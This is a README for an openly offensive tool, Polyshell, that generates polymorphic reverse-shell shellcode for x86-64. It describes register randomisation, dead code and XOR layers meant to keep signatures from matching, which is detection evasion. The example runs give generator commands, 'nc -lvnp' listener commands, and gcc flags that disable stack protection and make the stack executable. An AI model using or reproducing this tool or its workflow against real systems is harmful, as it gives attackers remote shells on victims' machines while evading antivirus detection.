
# Polyshell

Simple polymorphic reverse shell generator.\
\
This tool will randomly choose registry between `r8` to `r15` to handle the different file descriptors for the reverse shell.\
 It will also put some dead code within the shellcode so that none of the generated shell's signatures can't be identical.

```

     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 

       Simple polymorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/polyshell

    
usage: polyshell [-h] [-i IP] [-p PORT] [-e {big,little}] [-n NBXOR] [-b]

optional arguments:
  -h, --help            show this help message and exit
  -i IP, --ip IP        IPv4 Address
  -p PORT, --port PORT  Port to bind
  -e {big,little}, --endian {big,little}
                        Endianness of the target, default=little
  -n NBXOR, --nbxor NBXOR
                        Number of xor to put, default=10
  -b, --build           Compile the C file
```
## Requirements

`python3.X` and additionnaly `gcc` if you desire to compile the C file.


## Installation

```bash
git clone https://github.com/Vadimador/polyshell
cd polyshell
./main.py
```

You can add the polyshell main.py to path one of your PATH to execute it from anywhere.
```
cd polyshell
ln -s $(readlink -f main.py) ~/.local/bin/polyshell
```
    
## Run

### Create a reverse shell and build it

```bash
┌[t4yki@d3v]
└[~]> polyshell -i 127.0.0.1 -p 6666 -b


     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 

       Simple polymorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/polyshell

    
 [!] Shellcode generated!

 [+] Number of xor put : 10
 [+] IPv4 address to connect to : 127.0.0.1
 [+] Port to bind : 6666
 [+] Compiled shellcode : reverse_shell
 [+] Start a listener : nc -lvnp 6666
 ```

 ### Create a reverse shell and modify the number of xor
```bash
┌[Vadimador@d3v] 
└[~]> polyshell -i 127.0.0.1 -p 1024 -n 54 -b


     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 

       Simple polymorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/polyshell

    
 [!] Shellcode generated!

 [+] Number of xor put : 54
 [+] IPv4 address to connect to : 127.0.0.1
 [+] Port to bind : 1024
 [+] Compiled shellcode : reverse_shell
 [+] Start a listener : nc -lvnp 1024
```

### Create a reverse shell but don't build it, just save it to C file.

```bash
┌[Ninuuu@d3v] 
└[~]> polyshell -i 127.0.0.1 -p 4444 -n 88


     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 

       Simple polymorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/polyshell

    
 [!] Shellcode generated!

 [+] Number of xor put : 88
 [+] IPv4 address to connect to : 127.0.0.1
 [+] Port to bind : 4444
 [+] Shellcode at : reverse_shell.c
 [+] Build : gcc reverse_shell.c -o shell -fno-stack-protector -z execstack -no-pie
```